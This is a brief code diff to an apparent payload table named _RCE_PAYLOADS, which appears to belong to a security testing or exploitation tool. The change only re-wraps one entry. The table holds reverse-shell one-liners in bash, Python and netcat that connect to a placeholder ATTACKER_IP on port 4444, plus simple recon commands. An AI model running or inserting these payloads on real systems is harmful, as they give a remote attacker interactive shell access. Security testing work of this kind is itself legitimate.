@@ -49,7 +49,11 @@ _RCE_PAYLOADS = {
     "id": "id",
     "uname": "uname -a",
     "reverse_bash": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
-    "reverse_python": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+    "reverse_python": (
+        "python -c 'import socket,subprocess,os;s=socket.socket();"
+        "s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);"
+        "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+    ),
     "reverse_nc": "nc -e /bin/sh ATTACKER_IP 4444",
 }
 
